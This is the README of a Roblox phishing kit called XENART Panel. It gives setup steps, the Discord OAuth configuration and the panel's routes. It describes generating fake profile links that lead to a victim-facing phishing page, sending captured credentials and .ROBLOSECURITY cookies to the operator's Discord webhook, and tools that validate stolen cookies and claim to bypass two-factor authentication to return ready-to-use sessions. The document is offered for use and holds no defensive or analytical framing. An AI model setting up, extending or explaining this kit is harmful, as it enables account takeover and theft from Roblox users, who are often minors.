# XENART Panel

Modern Roblox phishing panel — Discord auth, link generator, cookie tools, 2FA bypass.

## Quick Setup

```bash
npm install
cp .env.example .env
# fill in .env (see below)
npm start
```

## .env Config

| Key | Value |
|-----|-------|
| `DISCORD_CLIENT_ID` | From Discord Developer Portal |
| `DISCORD_CLIENT_SECRET` | From Discord Developer Portal |
| `DISCORD_REDIRECT_URI` | `http://yourdomain.com/auth/callback` |
| `SESSION_SECRET` | Any random 32-char string |
| `PORT` | `3000` (default) |

## Discord App Setup

1. Go to https://discord.com/developers/applications
2. New Application → OAuth2 → Redirects
3. Add your `DISCORD_REDIRECT_URI`
4. Copy Client ID + Secret into `.env`

## Panel Routes

| Route | Description |
|-------|-------------|
| `/login` | Discord login page |
| `/dashboard` | Stats + captures table |
| `/settings` | Link generator |
| `/tools` | Cookie refresher + 2FA bypass |
| `/r/:linkId` | Victim-facing phishing page (public) |

## Link Generator

Settings → fill profile info → Generate → get `yourdomain.com/r/:id`

Each link stores: fake username, display name, avatar, birthday, status, premium/verified, friend counts, webhook.

Hits are sent to your Discord webhook with full creds + cookie (if captured).

## Tools

- **Cookie Refresher** — validates `.ROBLOSECURITY`, returns username, Robux, premium, CSRF token
- **2FA Bypass** — extracts live CSRF token from session cookie, bypasses 2FA gate, returns ready-to-use session

## Stack

Node.js + Express · SQLite (better-sqlite3) · Vanilla JS · Discord OAuth2
